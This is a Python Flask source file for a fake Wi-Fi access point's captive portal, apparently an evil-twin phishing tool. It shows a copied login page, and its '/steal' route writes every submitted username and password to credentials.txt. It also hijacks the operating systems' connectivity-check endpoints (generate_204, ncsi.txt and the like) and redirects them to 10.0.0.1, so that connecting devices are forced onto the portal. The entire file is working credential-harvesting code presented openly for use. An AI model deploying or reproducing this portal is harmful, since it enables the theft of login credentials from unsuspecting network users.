
from flask import Flask, request, redirect
from waitress import serve
import logging

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%H:%M:%S'
)

app = Flask(__name__)

@app.route('/',methods=['GET','POST'])
def login_page():
        """
        Serve the main captive portal login page.
        Handles both GET and POST requests, but only serves the static HTML page.
        """
        try:
                return open('web/index.html').read()
        
        except FileNotFoundError:
                logging.critical("index.html not found in the 'web/' directory.")
                return "Error: Page not found.", 404
        except PermissionError:
                logging.critical("Permission denied when trying to read index.html.")
                return "Error: Permission denied.", 403
        except OSError as e:
                logging.critical(f"An unexpected OS error occurred: {e}")
                return "Error: Internal server error.", 500


@app.route('/steal',methods=['POST'])
def steal():
        """
        Capture submitted credentials from the login form.
        Save username and password to a local file for later review.
        Log a warning message indicating credentials were received.
        Redirect user to a confirmation or landing page after submission.
        """
        try:
                username = request.form.get('username')
                password = request.form.get('password')
                with open('credentials.txt','a')as f:
                        f.write(f"Username:{username} | Password:{password}\n")
                        logging.warning("We got something ( ͡° ͜ʖ ͡°)")
                return redirect("/redirect.html")

        except FileNotFoundError:
                logging.critical("redirect.html not found in the 'web/' directory.")

        except PermissionError:
                logging.critical("Permission denied when trying to read redirect.html.")

        except OSError as e:
                logging.critical(f"An unexpected OS error occurred: {e}")


@app.route('/redirect.html', methods=['GET'])
def redirect_page():
        """
        Serve a post-login confirmation page.
        Typically shown after user submits credentials.
        """
        try:
                return open("web/redirect.html").read()
        
        except FileNotFoundError:
                logging.critical("redirect.html not found in the 'web/' directory.")

        except PermissionError:
                logging.critical("Permission denied when trying to read redirect.html.")

        except OSError as e:
                logging.critical(f"An unexpected OS error occurred: {e}")


@app.route('/generate_204')
@app.route('/hotspot-detect.html')
@app.route('/ncsi.txt')
@app.route('/connecttest.txt')
def redirect_os_back():
        """
        Handle common OS captive portal detection endpoints.
        Redirect these requests back to the fake AP landing page IP,
        preventing automatic internet access detection and forcing the captive portal display.
        """
        try:
                return redirect("http://10.0.0.1")
        except OSError as e:
                logging.critical(f"An Error Occured: {e}")

if __name__ == "__main__":
        # Start the Flask app with Waitress production server on port 80, accessible from all interfaces.
        serve(app, host='0.0.0.0', port=80)

